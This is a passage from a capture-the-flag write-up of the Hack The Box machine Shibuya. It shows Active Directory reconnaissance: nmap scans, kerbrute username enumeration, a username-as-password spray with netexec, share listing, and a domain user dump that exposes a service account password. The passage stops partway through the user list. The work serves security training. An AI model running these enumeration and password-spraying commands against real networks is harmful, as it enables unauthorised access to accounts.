---
title: HTB: Shibuya
url: https://0xdf.gitlab.io/2025/06/19/htb-shibuya.html
date: 2025-06-19T09:00:00+00:00
difficulty: Hard [40]
os: Windows
tags: hackthebox, htb-shibuya, vulnlab, ctf, nmap, netexec, kerbrute, credentials, windows-imaging, wim, secretsdump, crackstation, password-spray, bloodhound, sharphound, adcs, cross-session-relay, runascs, quinsta, remotepotato0, windows-firewall, firewall-enumeration, hashcat, certipy, esc1, proxychains, htb-rebound
---

![Shibuya](/img/shibuya-cover.png)

Shibuya starts with a brute force user enumeration over Kerberos, finding two machine accounts with their passwords set to their username. I’ll use those to enumerate LDAP, finding credentials for a service account in a comment. That user has access to an SMB share with three Windows Imaging images, and one contains backups of the registry hives. I’ll dump hashes from these, and spray them to get access to another user and a shell. There’s another user logged into the box, and I’ll use RemotePotato0 to get a shell with a cross session relay attack. This user can exploit ESC1 in the ADCS configuration to get administrator access.

## Box Info

| Name | [Shibuya](https://hackthebox.com/machines/shibuya)  [Shibuya](https://hackthebox.com/machines/shibuya) [Play on HackTheBox](https://hackthebox.com/machines/shibuya) |
| --- | --- |
| Release Date | [19 Jun 2025](https://twitter.com/hackthebox_eu/status/1935714229530607839) |
| Retire Date | 19 Jun 2025 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [xct xct](https://app.hackthebox.com/users/13569) |

## Recon

### Initial Scanning

`nmap` finds 18 open TCP ports:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.129.234.42
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 21:46 UTC
Nmap scan report for 10.129.234.42
Host is up (0.092s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49664/tcp open  unknown
49669/tcp open  unknown
51041/tcp open  unknown
51050/tcp open  unknown
51061/tcp open  unknown
51071/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.47 seconds
oxdf@hacky$ nmap -vv -p 22,53,88,135,139,445,464,593,3268,3269,3389,9389 -sCV 10.129.234.42
...[snip]...
Nmap scan report for 10.129.234.42
Host is up, received echo-reply ttl 127 (0.091s latency).
Scanned at 2025-05-11 21:47:43 UTC for 190s

PORT     STATE SERVICE       REASON          VERSION
22/tcp   open  ssh           syn-ack ttl 127 OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp   open  domain?       syn-ack ttl 127
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-11 22:02:32Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: shibuya.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:AWSJPDC0522.shibuya.vl
| Issuer: commonName=shibuya-AWSJPDC0522-CA/domainComponent=shibuya
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha512WithRSAEncryption
| Not valid before: 2025-02-15T07:26:20
| Not valid after:  2026-02-15T07:26:20
| MD5:   8b7d:cbab:0d10:bf99:f94f:4ea1:0872:618b
| SHA-1: 945d:150a:de26:1ee1:42f7:7cfa:5f9d:1205:e5a4:138d
| -----BEGIN CERTIFICATE-----
| MIIHUjCCBTqgAwIBAgITIwAAAAIbTKknK3CMGwAAAAAAAjANBgkqhkiG9w0BAQ0F
...[snip]...
| KgwRRAR/g8UMiN2+k3yROGgy0vFhmTwkhF43wDsH8PrYWdTs8bzp0FRezCn5wOWf
| gUfBEYm3
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: shibuya.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:AWSJPDC0522.shibuya.vl
| Issuer: commonName=shibuya-AWSJPDC0522-CA/domainComponent=shibuya
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha512WithRSAEncryption
| Not valid before: 2025-02-15T07:26:20
| Not valid after:  2026-02-15T07:26:20
| MD5:   8b7d:cbab:0d10:bf99:f94f:4ea1:0872:618b
| SHA-1: 945d:150a:de26:1ee1:42f7:7cfa:5f9d:1205:e5a4:138d
| -----BEGIN CERTIFICATE-----
| MIIHUjCCBTqgAwIBAgITIwAAAAIbTKknK3CMGwAAAAAAAjANBgkqhkiG9w0BAQ0F
...[snip]...
| gUfBEYm3
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: SHIBUYA
|   NetBIOS_Domain_Name: SHIBUYA
|   NetBIOS_Computer_Name: AWSJPDC0522
|   DNS_Domain_Name: shibuya.vl
|   DNS_Computer_Name: AWSJPDC0522.shibuya.vl
|   DNS_Tree_Name: shibuya.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-05-11T22:04:52+00:00
|_ssl-date: 2025-05-11T22:05:32+00:00; +14m41s from scanner time.
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Issuer: commonName=AWSJPDC0522.shibuya.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-02-18T08:24:25
| Not valid after:  2025-08-20T08:24:25
| MD5:   4246:05f7:afb9:7eb3:2348:d2f0:9fc2:79b3
| SHA-1: 26ad:cec9:1e96:7061:a186:9867:92cb:7bcf:220e:40e6
| -----BEGIN CERTIFICATE-----
| MIIC8DCCAdigAwIBAgIQHupD92/tYrRIVm9eKsHZyTANBgkqhkiG9w0BAQsFADAh
...[snip]...
| vP4hxdG9n8cZDtncd5mY/oYPtvNS/3gVUg8bt3hJ/l+ehxZP
|_-----END CERTIFICATE-----
9389/tcp open  mc-nmf        syn-ack ttl 127 .NET Message Framing
Service Info: Host: AWSJPDC0522; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-05-11T22:04:57
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 65218/tcp): CLEAN (Timeout)
|   Check 2 (port 54325/tcp): CLEAN (Timeout)
|   Check 3 (port 22528/udp): CLEAN (Timeout)
|   Check 4 (port 11487/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 14m40s, deviation: 0s, median: 14m40s
...[snip]...
Nmap done: 1 IP address (1 host up) scanned in 189.70 seconds

```

Many of these (53, 88, 464, 593, 3268, 3269) look like [Windows domain controller ports](/cheatsheets/os#windows-domain-controller). Others (135,139, 445) are [common Windows ports](/cheatsheets/os#windows-client). 3389 is remote desktop. SSH on 22 is interesting, and not super common, but not unheard of for Windows.

I’ll note that 389 (LDAP) and 636 (LDAPS) are not open, which will be limiting.

The domain `shibuya.vl` is present on the LDAPS certificates and over RDP, as well the name `AWSJPDC0522.shibuya.vl`.

### SMB - TCP 445

`netexec` shows the same host / domain information:

```

oxdf@hacky$ netexec smb 10.129.234.42
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)

```

I’m not able to list shares without a valid account:

```

oxdf@hacky$ netexec smb 10.129.234.42 -u guest -p '' --shares
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\guest: STATUS_ACCOUNT_DISABLED 
oxdf@hacky$ netexec smb 10.129.234.42 -u 0xdf -p '' --shares
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\0xdf: STATUS_LOGON_FAILURE

```

I’ll have `netexec` generate a hosts line for me:

```

oxdf@hacky$ netexec smb 10.129.234.42 --generate-hosts-file hosts
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
oxdf@hacky$ cat hosts 
10.129.234.42     AWSJPDC0522.shibuya.vl shibuya.vl AWSJPDC0522

```

I’ll add that to the top of my `/etc/hosts` file.

## Auth as red

### Kerberos Brute Force Usernames

With access to Kerberos, I can start by brute forcing usernames using `kerbrute` and the `userenum` mode. I’ll give it a large list, and it finds two users within a couple seconds:

```

oxdf@hacky$ kerbrute userenum -d shibuya.vl --dc 10.129.234.42 /opt/SecLists/Usernames/xato-net-10-million-usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/12/25 - Ronnie Flathers @ropnop

2025/05/12 00:49:43 >  Using KDC(s):
2025/05/12 00:49:43 >   10.129.234.42:88

2025/05/12 00:49:44 >  [+] VALID USERNAME:       purple@shibuya.vl
2025/05/12 00:49:46 >  [+] VALID USERNAME:       red@shibuya.vl
...[snip]...

```

If I let this run for many hours, it will find a bunch more:

```

2025/05/12 02:58:41 >  [+] VALID USERNAME:       william.thomas@shibuya.vl
2025/05/12 04:50:59 >  [+] VALID USERNAME:       stuart.taylor@shibuya.vl
2025/05/12 05:00:12 >  [+] VALID USERNAME:       stacey.jones@shibuya.vl
2025/05/12 06:14:17 >  [+] VALID USERNAME:       sally.brown@shibuya.vl
2025/05/12 09:41:09 >  [+] VALID USERNAME:       melissa.jones@shibuya.vl
2025/05/12 09:41:29 >  [+] VALID USERNAME:       melanie.grant@shibuya.vl
2025/05/12 11:40:40 >  [+] VALID USERNAME:       kevin.green@shibuya.vl
2025/05/12 11:41:28 >  [+] VALID USERNAME:       kerry.hall@shibuya.vl
2025/05/12 11:42:36 >  [+] VALID USERNAME:       kenneth.shaw@shibuya.vl
2025/05/12 11:43:43 >  [+] VALID USERNAME:       kelly.davies@shibuya.vl
2025/05/12 11:52:34 >  [+] VALID USERNAME:       karl.brown@shibuya.vl
2025/05/12 14:16:43 >  [+] VALID USERNAME:       gary.wood@shibuya.vl
2025/05/12 15:14:12 >  [+] VALID USERNAME:       emma.noble@shibuya.vl
2025/05/12 15:33:19 >  [+] VALID USERNAME:       dylan.brown@shibuya.vl
2025/05/12 16:23:58 >  [+] VALID USERNAME:       david.poole@shibuya.vl

```

I don’t need to find these with brute force because once I have valid creds, I can dump all the users.

### Username as Password

A common check would be for users with their password as their username. Trying this with NTLM login doesn’t show anything:

```

oxdf@hacky$ netexec smb shibuya.vl -u users -p users --no-bruteforce --continue-on-success 
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\red:red STATUS_LOGON_FAILURE 
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\purple:purple STATUS_LOGON_FAILURE

```

red and purple are actually machine accounts, which means it won’t work with NTLM. Using Kerberos, they both work:

```

oxdf@hacky$ netexec smb shibuya.vl -u users -p users --no-bruteforce --continue-on-success -k
SMB         shibuya.vl      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\red:red 
SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\purple:purple 

```

## Auth as svc\_autojoin

### Authenticated SMB

#### Shares

red has access to some shares:

```

oxdf@hacky$ netexec smb shibuya.vl -u red -p red -k --shares
SMB         shibuya.vl      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False) 
SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\red:red 
SMB         shibuya.vl      445    AWSJPDC0522      [*] Enumerated shares
SMB         shibuya.vl      445    AWSJPDC0522      Share           Permissions     Remark
SMB         shibuya.vl      445    AWSJPDC0522      -----           -----------     ------
SMB         shibuya.vl      445    AWSJPDC0522      ADMIN$                          Remote Admin
SMB         shibuya.vl      445    AWSJPDC0522      C$                              Default share
SMB         shibuya.vl      445    AWSJPDC0522      images$                         
SMB         shibuya.vl      445    AWSJPDC0522      IPC$            READ            Remote IPC
SMB         shibuya.vl      445    AWSJPDC0522      NETLOGON        READ            Logon server share 
SMB         shibuya.vl      445    AWSJPDC0522      SYSVOL          READ            Logon server share 
SMB         shibuya.vl      445    AWSJPDC0522      users           READ   

```

I’ll poke around at the `users` share, but nothing interesting. purple has the same access as red it seems.

#### Users

I’ll dump the full users list, 503 users:

```

oxdf@hacky$ netexec smb shibuya.vl -k -u red -p red --users
SMB         shibuya.vl      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\red:red
SMB         shibuya.vl      445    AWSJPDC0522      -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         shibuya.vl      445    AWSJPDC0522      _admin                        2025-02-15 07:55:29 0       Built-in account for administering the computer/domain
SMB         shibuya.vl      445    AWSJPDC0522      Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         shibuya.vl      445    AWSJPDC0522      krbtgt                        2025-02-15 07:24:57 0       Key Distribution Center Service Account
SMB         shibuya.vl      445    AWSJPDC0522      svc_autojoin                  2025-02-15 07:51:49 0       K5&A6Dw9d8jrKWhV
SMB         shibuya.vl      445    AWSJPDC0522      Leon.Warren                   2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Graeme.Kerr                   2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Joshua.North                  2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Shaun.Burton                  2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Gillian.Douglas               2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Kelly.Davies                  2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Conor.Fletcher                2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Karl.Brown                    2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Tracey.Wood                   2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Mohamed.Brooks                2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Wendy.Stevenson               2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Gerald.Allen                  2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Leigh.Harrison                2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Brian.Elliott                 2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Ashleigh.Hancock              2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Kevin.Green                   2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Mathew.Richardson             2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Stanley.Johnson               2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Sophie.Smith                  2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Thomas.Wilson                 2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Jacqueline.Taylor             2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Georgia.Smith                 2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Georgia.Kelly                 2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Alan.Green                    2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Mohammad.Todd                 2025-02-16 10:23:34 0
SMB         shibuya.vl      445    AWSJPDC0522      Graham.Francis                2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Elaine.Roberts                2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Ross.Allen                    2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Grace.Humphries               2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Roy.Shepherd                  2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Emma.Noble                    2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Ryan.Harris                   2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Suzanne.Webb                  2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Edward.Smith                  2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Ellie.Chapman                 2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Bradley.Evans                 2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Grace.King                    2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Eric.Barnes                   2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Tracey.Holmes                 2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Joan.White                    2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Leslie.Osborne                2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Frederick.Smith               2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Joseph.Rowe                   2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Melanie.Brown                 2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Jodie.Jenkins                 2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Bethany.Watson                2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Cameron.Begum                 2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Jenna.Abbott                  2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Karl.Smith                    2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Arthur.Walker                 2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Sheila.Roberts                2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Tom.Barnes                    2025-02-16 10:23:35 0
SMB         shibuya.vl      445    AWSJPDC0522      Stuart.French                 2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      William.Johnson               2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      David.Poole                   2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      Charlene.Walsh                2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      Jessica.Gordon                2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      Francesca.Day                 2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      William.Brown                 2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      Sylvia.Doyle                  2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      William.Thomas                2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      Craig.Owen                    2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      Leon.Daly                     2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      Jacob.Preston                 2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      Lynn.Pearson                  2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      Antony.Howell                 2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      Mary.Grant                    2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      Shirley.Matthews              2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      Louis.Bond                    2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      Norman.Clayton                2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      Rhys.Moore                    2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      Lynn.Gregory                  2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      Abdul.Mason                   2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      Diana.Rowe                    2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      Olivia.Houghton               2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      Katy.Webster                  2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      Judith.Black                  2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      Henry.Gallagher               2025-02-16 10:23:36 0
SMB         shibuya.vl      445    AWSJPDC0522      Ryan.Horton                   2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Dylan.Booth                   2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Nathan.Matthews               2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Georgia.Carter                2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Derek.Wade                    2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      David.Cole                    2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Lynn.Harrison                 2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Rachel.Flynn                  2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Jade.Smith                    2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Hannah.Taylor                 2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Carole.Barrett                2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Brenda.Peacock                2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Robin.Stevens                 2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Victoria.Jones                2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Victor.Clarke                 2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Joel.Bailey                   2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Stanley.Lowe                  2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Billy.Williams                2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Lorraine.Barber               2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Nicole.Walsh                  2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Mohamed.Daniels               2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Joseph.Woods                  2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Elliott.Hill                  2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Marie.Campbell                2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Cheryl.Patel                  2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Samuel.Curtis                 2025-02-16 10:23:37 0
SMB         shibuya.vl      445    AWSJPDC0522      Dennis.Little                 2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Rachael.Taylor                2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Helen.Walton                  2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Richard.Stokes                2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Hilary.Collins                2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Christopher.Brookes           2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Max.Day                       2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Marcus.Stevenson              2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Leon.Murray                   2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Carly.Franklin                2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Luke.Nash                     2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Terry.Saunders                2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Callum.Walker                 2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Roger.Mills                   2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Elliott.Page                  2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Barry.Green                   2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Jill.Clarke                   2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Vanessa.Harris                2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Ross.Smith                    2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Jane.Stewart                  2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Gemma.Simpson                 2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Donald.Holmes                 2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Tracy.Ferguson                2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Damien.Dixon                  2025-02-16 10:23:38 0
SMB         shibuya.vl      445    AWSJPDC0522      Geraldine.Herbert             2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Sarah.Warner                  2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Bryan.Watts                   2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Hayley.Morgan                 2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Glenn.Gough                   2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Sam.Stone                     2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Susan.Baker                   2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Eileen.Anderson               2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Vincent.Bryan                 2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Deborah.Edwards               2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Rosemary.Edwards              2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Dominic.Matthews              2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Sylvia.Farrell                2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Amanda.Wall                   2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Timothy.Freeman               2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Bethan.Davies                 2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Alan.Pearce                   2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Stanley.Smart                 2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Susan.Butler                  2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Hannah.Thompson               2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Janice.Connolly               2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Rhys.Marsh                    2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Phillip.Campbell              2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Norman.Evans                  2025-02-16 10:23:39 0
